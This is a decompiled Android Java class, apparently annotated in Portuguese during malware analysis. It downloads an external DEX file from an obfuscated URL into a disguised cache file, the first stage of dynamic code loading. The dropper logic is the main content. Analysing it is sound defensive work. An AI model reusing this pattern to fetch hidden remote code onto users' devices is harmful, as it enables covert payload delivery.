package defpackage;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;

/**
 * DexDownloader - Classe responsável pelo download do DEX externo
 * Extraída de: C1987rE.java (originalmente obfuscada)
 * 
 * Esta classe implementa o primeiro passo do Dynamic Code Loading (DCL):
 * baixa o arquivo DEX externo de uma URL ofuscada e salva no cache do app.
 */
public final class DexDownloader extends F30 implements InterfaceC2641zv {
    public final /* synthetic */ HE context;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public DexDownloader(HE he, InterfaceC1945qi interfaceC1945qi) {
        super(2, interfaceC1945qi);
        this.context = he;
    }

    @Override // defpackage.InterfaceC2641zv
    public final Object k(Object obj, Object obj2) {
        return ((DexDownloader) p((InterfaceC1945qi) obj2, (InterfaceC1490kj) obj)).downloadDex(C0997e90.a);
    }

    @Override // defpackage.AbstractC1178gb
    public final InterfaceC1945qi p(InterfaceC1945qi interfaceC1945qi, Object obj) {
        return new DexDownloader(this.context, interfaceC1945qi);
    }

    /**
     * downloadDex - Baixa o DEX externo de uma URL ofuscada
     * Originalmente: r(Object obj)
     * 
     * Processo:
     * 1. Decodifica a URL do DEX usando StringObfuscator.getObfuscatedString('B')
     * 2. Cria diretório de cache se não existir
     * 3. Gera nome único para o arquivo DEX
     * 4. Baixa o DEX da URL
     * 5. Salva no cache do app
     * 6. Retorna o caminho do arquivo baixado
     */
    @Override // defpackage.AbstractC1178gb
    public final Object downloadDex(Object obj) throws Throwable {
        AbstractC1377jB.O(obj);
        try {
            // Decodifica URL do DEX usando string ofuscada
            String dexUrl = StringObfuscator.getObfuscatedString('B');
            
            // Cria diretório de cache para updates
            File cacheDir = new File(this.context.e.getCacheDir(), "updates");
            if (!cacheDir.exists()) {
                cacheDir.mkdirs();
            }
            
            // Gera nome único para o arquivo DEX
            File dexFile = new File(cacheDir, "component_" + System.currentTimeMillis() + ".dex");
            
            // Configura conexão HTTP
            URLConnection connection = new URL(dexUrl).openConnection();
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(15000);
            
            // Baixa o DEX
            InputStream inputStream = connection.getInputStream();
            try {
                FileOutputStream fileOutputStream = new FileOutputStream(dexFile);
                try {
                    // Copia dados do input stream para o arquivo
                    AbstractC0413Py.B(inputStream, fileOutputStream);
                    AbstractC0576Wf.o(fileOutputStream, null);
                    AbstractC0576Wf.o(inputStream, null);
                    
                    // Verifica se o arquivo foi baixado corretamente
                    if (!dexFile.exists() || dexFile.length() <= 0) {
                        return null;
                    }
                    
                    return dexFile.getAbsolutePath();
                } finally {
                }
            } finally {
            }
        } catch (Exception unused) {
            return null;
        }
    }
}
